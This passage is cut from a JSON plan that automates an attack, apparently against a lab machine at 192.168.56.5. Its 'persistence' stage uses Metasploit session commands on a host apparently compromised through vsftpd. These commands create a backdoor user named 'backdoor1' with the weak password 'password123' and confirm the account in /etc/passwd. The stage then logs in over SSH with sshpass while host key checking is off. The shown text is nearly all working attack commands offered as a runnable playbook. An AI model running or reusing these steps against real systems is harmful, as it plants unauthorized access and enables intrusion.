                },
                {
                    "stage": "persistence",
                    "description": "Create backdoor user for SSH access",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor1'",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c \"echo 'backdoor1:password123' | chpasswd\"",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor1'",
                            "wait": 2
                        },
                        {
                            "type": "close_session",
                            "session_name": "vsftpd_session"
                        },
                        {
                            "type": "regular",
                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=ssh-rsa,ssh-dss backdoor1@192.168.56.5 'whoami'"
                        }
                    ],
                    "verification": "SSH login succeeds and returns 'backdoor1'"
                }
            ]
